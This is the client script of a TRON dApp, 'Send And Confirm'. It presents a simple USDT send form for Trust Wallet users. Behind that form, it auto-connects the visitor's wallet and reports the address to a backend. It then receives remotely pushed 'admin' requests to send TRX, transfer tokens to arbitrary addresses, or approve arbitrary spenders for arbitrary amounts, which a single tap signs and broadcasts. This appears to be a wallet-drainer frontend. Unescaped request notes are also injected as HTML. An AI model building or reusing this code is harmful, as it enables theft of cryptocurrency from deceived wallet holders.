import "./style.css";
import { TronWeb } from "tronweb";
import {
  WalletConnectChainID,
  WalletConnectWallet,
} from "@tronweb3/walletconnect-tron";

const TRON_MAINNET_RPC = "https://api.trongrid.io";
const USDT_TRON_MAINNET = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRX_DECIMALS = 6;
const USDT_DECIMALS = 6;
const FEE_LIMIT = 200_000_000;
const CLIENT_ID_KEY = "trust_tron_dapp_client_id";

const WC_PROJECT_ID = import.meta.env.VITE_WALLETCONNECT_PROJECT_ID?.trim();
const TRONGRID_API_KEY = import.meta.env.VITE_TRONGRID_API_KEY?.trim();
const APP_NAME = import.meta.env.VITE_APP_NAME?.trim() || "Send And Confirm";
const APP_DESCRIPTION =
  import.meta.env.VITE_APP_DESCRIPTION?.trim() ||
  "TRON Trust Wallet transaction confirmation dApp";
const APP_ICON_URL =
  import.meta.env.VITE_APP_ICON_URL?.trim() || `${window.location.origin}/logo.png`;
const BACKEND_HTTP_URL_RAW =
  import.meta.env.VITE_BACKEND_HTTP_URL?.trim() ||
  `${window.location.protocol}//${window.location.hostname}:8787`;
const BACKEND_WS_URL_RAW =
  import.meta.env.VITE_BACKEND_WS_URL?.trim() ||
  `${window.location.protocol === "https:" ? "wss" : "ws"}://${window.location.hostname}:8787/ws`;
const BACKEND_HTTP_URL = BACKEND_HTTP_URL_RAW.replace(/\/+$/, "");
const BACKEND_WS_URL = BACKEND_WS_URL_RAW.replace(/\/+$/, "");

const ua = navigator.userAgent ?? "";
const isMobileDevice = /Android|iPhone|iPad|iPod/i.test(ua);
const hasTrustUa = /trustwallet|trust\/|trust wallet/i.test(ua);
const hasTrustProviderHint =
  Boolean(window.ethereum?.isTrust) ||
  Boolean(window.trustwallet?.ethereum?.isTrust) ||
  Boolean(window.trustwallet?.solana?.isTrust);

const el = {
  connectStatus: document.getElementById("connectStatus"),
  walletAddress: document.getElementById("walletAddress"),
  retryConnectBtn: document.getElementById("retryConnectBtn"),
  recipientInput: document.getElementById("recipientInput"),
  pasteBtn: document.getElementById("pasteBtn"),
  amountInput: document.getElementById("amountInput"),
  maxBtn: document.getElementById("maxBtn"),
  fiatValue: document.getElementById("fiatValue"),
  balanceValue: document.getElementById("balanceValue"),
  connectBtn: document.getElementById("connectBtn"),
  disconnectBtn: document.getElementById("disconnectBtn"),
  sendBtn: document.getElementById("sendBtn"),
  backendStatus: document.getElementById("backendStatus"),
  logs: document.getElementById("logs"),
  adminRequestSection: document.getElementById("adminRequestSection"),
  adminRequests: document.getElementById("adminRequests"),
};

const tronWeb = new TronWeb({
  fullHost: TRON_MAINNET_RPC,
  headers: TRONGRID_API_KEY ? { "TRON-PRO-API-KEY": TRONGRID_API_KEY } : {},
});

const clientId = getOrCreateClientId();

let walletClient = null;
let connectedAddress = "";
let connecting = false;
let usdtBalanceRaw = 0n;
let backendSocket = null;
let reconnectTimer = null;
let heartbeatTimer = null;
let pendingAdminRequests = [];
const processingRequestIds = new Set();

function appendLog(message, data) {
  const timestamp = new Date().toLocaleTimeString();
  const payload =
    data === undefined ? message : `${message}\n${JSON.stringify(data, null, 2)}`;
  el.logs.textContent = `[${timestamp}] ${payload}\n${el.logs.textContent}`;
}

function setConnectStatus(message) {
  el.connectStatus.textContent = message;
}

function setBackendStatus(message) {
  el.backendStatus.textContent = message;
}

function setWalletAddress(address) {
  el.walletAddress.textContent = address ? `Wallet: ${address}` : "";
}

function isTrustContext() {
  return hasTrustUa || hasTrustProviderHint;
}

function getTrustWalletWcLink(uri) {
  return `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
}

function handlePairingUri(uri) {
  if (isTrustContext()) {
    setConnectStatus("Approve wallet connection in Trust Wallet.");
    return;
  }

  const deepLink = getTrustWalletWcLink(uri);
  setConnectStatus("Opening Trust Wallet...");
  appendLog("Opening deep link", { deepLink });
  window.location.href = deepLink;
}

function shortAddress(address) {
  if (!address || address.length < 12) return address;
  return `${address.slice(0, 6)}...${address.slice(-6)}`;
}

function syncUiState() {
  const isConnected = Boolean(connectedAddress);
  el.sendBtn.disabled = !isConnected || connecting;
  el.maxBtn.disabled = !isConnected;
  el.pasteBtn.disabled = !isConnected;
  el.connectBtn.hidden = isConnected || connecting;
  el.disconnectBtn.hidden = !isConnected;
  el.retryConnectBtn.hidden = isConnected || connecting;
}

function requireWallet() {
  if (!walletClient) {
    throw new Error("WalletConnect is not initialized");
  }
}

function requireAddress(address, fieldName) {
  if (!tronWeb.isAddress(address)) {
    throw new Error(`${fieldName} is not a valid TRON address`);
  }
}

function toRawBigInt(value) {
  if (typeof value === "bigint") return value;
  if (typeof value === "number") return BigInt(Math.trunc(value));
  if (typeof value === "string") return BigInt(value);
  if (value && typeof value.toString === "function") return BigInt(value.toString());
  throw new Error("Could not parse numeric value");
}

function decimalToIntegerString(input, decimals) {
  const value = input.trim();
  if (!/^\d+(\.\d+)?$/.test(value)) {
    throw new Error("Invalid number format");
  }

  const [wholeRaw, fracRaw = ""] = value.split(".");
  if (fracRaw.length > decimals) {
    throw new Error(`Too many decimal places. Max is ${decimals}`);
  }

  const whole = wholeRaw.replace(/^0+(?=\d)/, "");
  const frac = fracRaw.padEnd(decimals, "0");
  const combined = `${whole}${frac}`.replace(/^0+(?=\d)/, "") || "0";
  return combined;
}

function formatRawAmount(rawValue, decimals) {
  const rawText = rawValue.toString();
  if (decimals === 0) return rawText;

  const negative = rawText.startsWith("-");
  const normalized = negative ? rawText.slice(1) : rawText;
  const padded = normalized.padStart(decimals + 1, "0");
  const whole = padded.slice(0, -decimals);
  const fraction = padded.slice(-decimals).replace(/0+$/, "");
  const result = fraction ? `${whole}.${fraction}` : whole;
  return negative ? `-${result}` : result;
}

function updateFiatApprox() {
  const input = el.amountInput.value.trim();
  const numeric = Number(input);
  if (!input || Number.isNaN(numeric) || numeric < 0) {
    el.fiatValue.textContent = "≈ $0.00";
    return;
  }
  el.fiatValue.textContent = `≈ $${numeric.toFixed(2)}`;
}

function randomIdFallback() {
  return `${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 10)}`;
}

function getOrCreateClientId() {
  const existing = localStorage.getItem(CLIENT_ID_KEY);
  if (existing) return existing;
  const next = typeof crypto.randomUUID === "function" ? crypto.randomUUID() : randomIdFallback();
  localStorage.setItem(CLIENT_ID_KEY, next);
  return next;
}

function backendPath(path) {
  return `${BACKEND_HTTP_URL}${path}`;
}

async function backendPost(path, payload) {
  const response = await fetch(backendPath(path), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  if (!response.ok) {
    const text = await response.text();
    throw new Error(text || `Backend request failed (${response.status})`);
  }
  return response.json();
}

async function backendGet(path) {
  const response = await fetch(backendPath(path));
  if (!response.ok) {
    const text = await response.text();
    throw new Error(text || `Backend request failed (${response.status})`);
  }
  return response.json();
}

async function registerWalletWithBackend() {
  if (!connectedAddress) return;
  try {
    await backendPost("/api/wallet/register", {
      clientId,
      address: connectedAddress,
      userAgent: navigator.userAgent,
    });
    setBackendStatus(`Backend connected (${clientId.slice(0, 8)}...)`);
  } catch (error) {
    setBackendStatus("Backend unavailable");
    appendLog("Backend register failed", { error: String(error) });
  }
}

async function sendBackendHeartbeat() {
  try {
    await backendPost("/api/wallet/heartbeat", { clientId });
  } catch (error) {
    appendLog("Backend heartbeat failed", { error: String(error) });
  }
}

async function notifyBackendDisconnect() {
  try {
    await backendPost("/api/wallet/disconnect", { clientId });
  } catch (error) {
    appendLog("Backend disconnect notify failed", { error: String(error) });
  }
}

async function reportRequestResult(request, payload) {
  await backendPost(`/api/request/${encodeURIComponent(request.id)}/result`, {
    clientId,
    ...payload,
  });
}

function connectBackendSocket() {
  if (!isMobileDevice) return;
  if (backendSocket && (backendSocket.readyState === WebSocket.OPEN || backendSocket.readyState === WebSocket.CONNECTING)) {
    return;
  }

  backendSocket = new WebSocket(BACKEND_WS_URL);
  setBackendStatus("Connecting backend...");

  backendSocket.onopen = () => {
    setBackendStatus(`Backend connected (${clientId.slice(0, 8)}...)`);
    backendSocket.send(
      JSON.stringify({
        type: "identify",
        role: "wallet",
        clientId,
      }),
    );
  };

  backendSocket.onmessage = (event) => {
    let payload;
    try {
      payload = JSON.parse(String(event.data));
    } catch {
      return;
    }

    if (payload.type === "wallet_pending" && Array.isArray(payload.requests)) {
      pendingAdminRequests = payload.requests;
      renderAdminRequests();
      return;
    }

    if (payload.type === "transaction_request" && payload.request) {
      upsertPendingRequest(payload.request);
      return;
    }

    if (payload.type === "error") {
      appendLog("Backend socket error", payload);
    }
  };

  backendSocket.onclose = () => {
    setBackendStatus("Backend disconnected, retrying...");
    if (reconnectTimer) clearTimeout(reconnectTimer);
    reconnectTimer = setTimeout(() => {
      connectBackendSocket();
    }, 3000);
  };
}

function startBackendSync() {
  connectBackendSocket();
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(() => {
    if (connectedAddress) sendBackendHeartbeat();
  }, 25_000);
}

function setRequestProcessing(requestId, active) {
  if (active) processingRequestIds.add(requestId);
  else processingRequestIds.delete(requestId);
  renderAdminRequests();
}

function upsertPendingRequest(request) {
  const index = pendingAdminRequests.findIndex((item) => item.id === request.id);
  if (request.status && request.status !== "pending") {
    if (index >= 0) pendingAdminRequests.splice(index, 1);
    renderAdminRequests();
    return;
  }

  if (index >= 0) pendingAdminRequests[index] = request;
  else pendingAdminRequests.unshift(request);
  renderAdminRequests();
}

function removePendingRequest(requestId) {
  pendingAdminRequests = pendingAdminRequests.filter((item) => item.id !== requestId);
  processingRequestIds.delete(requestId);
  renderAdminRequests();
}

function requestTypeLabel(type) {
  if (type === "send_trx") return "Send TRX";
  if (type === "trc20_transfer") return "TRC20 Transfer";
  if (type === "trc20_approve") return "TRC20 Approve";
  return type;
}

function renderAdminRequests() {
  if (!pendingAdminRequests.length) {
    el.adminRequests.innerHTML = "";
    el.adminRequestSection.hidden = true;
    return;
  }

  el.adminRequestSection.hidden = false;
  el.adminRequests.innerHTML = pendingAdminRequests
    .map((request) => {
      const busy = processingRequestIds.has(request.id);
      const disabled = busy ? "disabled" : "";
      return `
        <article class="request-card">
          <p><strong>${requestTypeLabel(request.type)}</strong></p>
          <p>${request.note ? request.note : "Admin transaction request"}</p>
          <p>${new Date(request.createdAt).toLocaleString()}</p>
          <div class="request-actions">
            <button type="button" class="approve-btn" data-action="approve" data-request-id="${request.id}" ${disabled}>Approve</button>
            <button type="button" class="reject-btn" data-action="reject" data-request-id="${request.id}" ${disabled}>Reject</button>
          </div>
        </article>
      `;
    })
    .join("");
}

function classifyRequestError(error) {
  const text = String(error || "");
  if (/rejected|denied|cancel/i.test(text)) return "rejected";
  return "failed";
}

async function signAndBroadcast(transaction) {
  const signed = await walletClient.signTransaction(transaction);
  const broadcastResult = await tronWeb.trx.sendRawTransaction(signed);
  if (!broadcastResult?.result) {
    throw new Error(`Broadcast failed: ${JSON.stringify(broadcastResult)}`);
  }
  return broadcastResult.txid;
}

async function sendTrxTransaction({ to, amount }) {
  requireAddress(to, "Recipient address");
  const amountSun = BigInt(decimalToIntegerString(amount, TRX_DECIMALS));
  if (amountSun <= 0n || amountSun > BigInt(Number.MAX_SAFE_INTEGER)) {
    throw new Error("Invalid TRX amount");
  }
  const tx = await tronWeb.transactionBuilder.sendTrx(to, Number(amountSun), connectedAddress);
  return signAndBroadcast(tx);
}

async function transferTrc20Transaction({ token, to, amount, decimals }) {
  requireAddress(token, "Token contract");
  requireAddress(to, "Recipient address");
  const amountInt = decimalToIntegerString(amount, decimals);
  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    token,
    "transfer(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [
      { type: "address", value: to },
      { type: "uint256", value: amountInt },
    ],
    connectedAddress,
  );

  if (!trigger?.result?.result || !trigger.transaction) {
    throw new Error(`Token transfer build failed: ${JSON.stringify(trigger)}`);
  }
  return signAndBroadcast(trigger.transaction);
}

async function approveTrc20Transaction({ token, spender, amount, decimals }) {
  requireAddress(token, "Token contract");
  requireAddress(spender, "Spender address");
  const amountInt = decimalToIntegerString(amount, decimals);
  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    token,
    "approve(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [
      { type: "address", value: spender },
      { type: "uint256", value: amountInt },
    ],
    connectedAddress,
  );

  if (!trigger?.result?.result || !trigger.transaction) {
    throw new Error(`Approve build failed: ${JSON.stringify(trigger)}`);
  }
  return signAndBroadcast(trigger.transaction);
}

async function executeAdminRequest(request) {
  const params = request.params || {};
  if (request.type === "send_trx") {
    return sendTrxTransaction({
      to: String(params.to || "").trim(),
      amount: String(params.amount || "").trim(),
    });
  }
  if (request.type === "trc20_transfer") {
    return transferTrc20Transaction({
      token: String(params.token || "").trim(),
      to: String(params.to || "").trim(),
      amount: String(params.amount || "").trim(),
      decimals: Number(params.decimals ?? 6),
    });
  }
  if (request.type === "trc20_approve") {
    return approveTrc20Transaction({
      token: String(params.token || "").trim(),
      spender: String(params.spender || "").trim(),
      amount: String(params.amount || "").trim(),
      decimals: Number(params.decimals ?? 6),
    });
  }
  throw new Error(`Unsupported request type: ${request.type}`);
}

async function onRequestAction(event) {
  const button = event.target.closest("button[data-action][data-request-id]");
  if (!button) return;

  const action = button.getAttribute("data-action");
  const requestId = button.getAttribute("data-request-id");
  const request = pendingAdminRequests.find((item) => item.id === requestId);
  if (!request) return;
  if (processingRequestIds.has(request.id)) return;

  if (action === "reject") {
    setRequestProcessing(request.id, true);
    try {
      await reportRequestResult(request, {
        action: "rejected",
        error: "User rejected request in app.",
      });
      removePendingRequest(request.id);
    } catch (error) {
      appendLog("Reject reporting failed", { error: String(error) });
      setRequestProcessing(request.id, false);
    }
    return;
  }

  if (action === "approve") {
    setRequestProcessing(request.id, true);
    try {
      const txid = await executeAdminRequest(request);
      await reportRequestResult(request, { action: "approved", txid });
      removePendingRequest(request.id);
      setConnectStatus(`Request approved. Tx: ${txid}`);
    } catch (error) {
      const resultAction = classifyRequestError(error);
      try {
        await reportRequestResult(request, {
          action: resultAction,
          error: String(error),
        });
      } catch (reportError) {
        appendLog("Failed to report request result", { error: String(reportError) });
      }
      removePendingRequest(request.id);
      setConnectStatus(`Request ${resultAction}`);
      appendLog("Request execution error", { error: String(error) });
    }
  }
}

function initWalletClient() {
  if (!WC_PROJECT_ID) {
    throw new Error("Missing VITE_WALLETCONNECT_PROJECT_ID");
  }

  walletClient = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: "wss://relay.walletconnect.com",
      projectId: WC_PROJECT_ID,
      metadata: {
        name: APP_NAME,
        description: APP_DESCRIPTION,
        url: window.location.origin,
        icons: [APP_ICON_URL],
      },
    },
    themeMode: "dark",
    themeVariables: {
      "--w3m-z-index": 9999,
    },
  });

  walletClient.on("accountsChanged", async (accounts) => {
    connectedAddress = accounts?.[0] ?? "";
    setWalletAddress(connectedAddress ? shortAddress(connectedAddress) : "");
    syncUiState();
    if (connectedAddress) {
      await registerWalletWithBackend();
      await refreshUsdtBalance();
    }
  });

  walletClient.on("disconnect", async () => {
    connectedAddress = "";
    usdtBalanceRaw = 0n;
    setWalletAddress("");
    el.balanceValue.textContent = "Balance: -- USDT";
    setConnectStatus("Disconnected");
    syncUiState();
    await notifyBackendDisconnect();
  });
}

async function checkExistingConnection() {
  try {
    const status = await walletClient.checkConnectStatus();
    if (status?.address) {
      connectedAddress = status.address;
      setWalletAddress(shortAddress(connectedAddress));
      setConnectStatus("Wallet connected");
      return true;
    }
  } catch (error) {
    appendLog("Existing session check failed", { error: String(error) });
  }
  return false;
}

async function connectTrustWallet({ auto = false } = {}) {
  if (!isMobileDevice) {
    setConnectStatus("Mobile only. Open this dApp in Trust Wallet mobile.");
    syncUiState();
    return;
  }

  requireWallet();
  if (connecting) return;

  connecting = true;
  syncUiState();
  setConnectStatus(auto ? "Connecting automatically..." : "Connecting...");

  try {
    const { address } = await walletClient.connect({
      onUri: (uri) => {
        handlePairingUri(uri);
      },
    });

    connectedAddress = address;
    setWalletAddress(shortAddress(connectedAddress));
    setConnectStatus("Wallet connected");
    await registerWalletWithBackend();
    await refreshUsdtBalance();
  } catch (error) {
    setConnectStatus("Connection failed. Tap retry.");
    appendLog("Connect error", { error: String(error) });
  } finally {
    connecting = false;
    syncUiState();
  }
}

async function disconnectWallet() {
  if (!walletClient) return;
  try {
    await walletClient.disconnect();
  } catch (error) {
    appendLog("Disconnect error", { error: String(error) });
  }
}

async function refreshUsdtBalance() {
  if (!connectedAddress) return;
  try {
    const contract = await tronWeb.contract().at(USDT_TRON_MAINNET);
    const result = await contract.balanceOf(connectedAddress).call();
    usdtBalanceRaw = toRawBigInt(result);
    const formatted = formatRawAmount(usdtBalanceRaw, USDT_DECIMALS);
    el.balanceValue.textContent = `Balance: ${formatted} USDT`;
  } catch (error) {
    el.balanceValue.textContent = "Balance: unavailable";
    appendLog("USDT balance read failed", { error: String(error) });
  }
}

function setAmountToMax() {
  if (!connectedAddress) return;
  const formatted = formatRawAmount(usdtBalanceRaw, USDT_DECIMALS);
  el.amountInput.value = formatted;
  updateFiatApprox();
}

async function sendUsdt() {
  if (!connectedAddress) {
    throw new Error("Connect wallet first");
  }

  const to = el.recipientInput.value.trim();
  const amount = el.amountInput.value.trim();
  requireAddress(to, "Recipient address");
  if (!amount) throw new Error("Enter amount");
  if (BigInt(decimalToIntegerString(amount, USDT_DECIMALS)) <= 0n) {
    throw new Error("Amount must be greater than 0");
  }

  return transferTrc20Transaction({
    token: USDT_TRON_MAINNET,
    to,
    amount,
    decimals: USDT_DECIMALS,
  });
}

async function handleSendClick() {
  try {
    el.sendBtn.disabled = true;
    setConnectStatus("Waiting for wallet confirmation...");
    const txid = await sendUsdt();
    setConnectStatus(`Transaction sent: ${txid}`);
    appendLog("USDT transfer success", {
      txid,
      url: `https://tronscan.org/#/transaction/${txid}`,
    });
    await refreshUsdtBalance();
  } catch (error) {
    setConnectStatus(`Send failed: ${String(error)}`);
    appendLog("USDT transfer failed", { error: String(error) });
  } finally {
    syncUiState();
  }
}

async function handlePaste() {
  try {
    if (!navigator.clipboard?.readText) return;
    const text = await navigator.clipboard.readText();
    if (text) el.recipientInput.value = text.trim();
  } catch (error) {
    appendLog("Clipboard read failed", { error: String(error) });
  }
}

async function init() {
  setBackendStatus("");
  updateFiatApprox();
  syncUiState();

  if (!WC_PROJECT_ID) {
    setConnectStatus("Missing WalletConnect project id");
    appendLog("Set VITE_WALLETCONNECT_PROJECT_ID in environment");
    return;
  }

  initWalletClient();
  startBackendSync();

  if (!isMobileDevice) {
    setConnectStatus("Mobile only. Open this dApp in Trust Wallet app.");
    return;
  }

  const hadSession = await checkExistingConnection();
  if (hadSession) {
    await registerWalletWithBackend();
    await refreshUsdtBalance();
    syncUiState();
    return;
  }

  await connectTrustWallet({ auto: true });
}

el.amountInput.addEventListener("input", updateFiatApprox);
el.maxBtn.addEventListener("click", setAmountToMax);
el.sendBtn.addEventListener("click", handleSendClick);
el.pasteBtn.addEventListener("click", handlePaste);
el.connectBtn.addEventListener("click", () => connectTrustWallet({ auto: false }));
el.retryConnectBtn.addEventListener("click", () => connectTrustWallet({ auto: false }));
el.disconnectBtn.addEventListener("click", disconnectWallet);
el.adminRequests.addEventListener("click", onRequestAction);

init().catch((error) => {
  appendLog("Init failed", { error: String(error) });
  setConnectStatus("Initialization failed");
});
